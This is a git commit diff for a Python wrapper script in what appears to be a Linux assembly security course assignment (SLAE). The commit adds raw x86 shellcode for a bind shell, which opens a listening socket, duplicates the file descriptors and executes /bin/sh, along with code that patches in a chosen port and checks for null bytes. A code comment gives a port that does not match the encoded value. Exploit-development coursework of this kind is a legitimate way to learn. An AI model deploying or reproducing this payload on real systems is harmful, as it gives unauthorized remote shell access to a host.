03a59df0ac453c774219141eb1d7b678cb77ee16
jayeshchm <59499796+jayeshchm@users.noreply.github.com>
2020-06-20 19:49:31 +0530

    Update wrapper.py

--- SLAE assignment 1./wrapper.py
+++ SLAE assignment 1./wrapper.py
@@ -1,13 +1,18 @@
 #!/usr/bin/python
-
+# The below shellcode listens on 44510
 print 'Usage: ./wrapper.py <port-no>' + '\n'
-print 'Kindly use port greater than 1024'
-
-print '\n'
+print 'Kindly use port greater than 1024' + '\n'
 
 import sys
 
-shellcode=""; # Put shellcode here
+shellcode  = ""
+shellcode  = "\x29\xc0\x29\xdb\x99\xfe\xc3\x50\x53\x6a\x02\x89\xe1\xb0"
+shellcode += "\x66\xcd\x80\x89\xc6\x52\x66\x68\xad\xde\xfe\xc3\x66\x53"
+shellcode += "\x89\xe1\x6a\x10\x51\x56\xb0\x66\x89\xe1\xcd\x80\x53\x56"
+shellcode += "\x89\xe1\x01\xdb\xb0\x66\xcd\x80\x52\x52\x56\xfe\xc3\x89"
+shellcode += "\xe1\xb0\x66\xcd\x80\x89\xc7\x29\xc9\xb0\x3f\x89\xfb\x80"
+shellcode += "\xf9\x01\xcd\x80\xfe\xc1\x79\xf3\xb0\x0b\x52\x68\x2f\x2f"
+shellcode += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"
 
 shellcode1 = []
 l = 0
@@ -53,4 +58,5 @@ for i in bytearray(shellcode1):
 		print 'Shellcode has null byte at:%d' %ptr
 		break
 
+print 'Shellcode length:%d\n' %len(shellcode1)
 print '\"' + encoded + '\"' + '\n' 
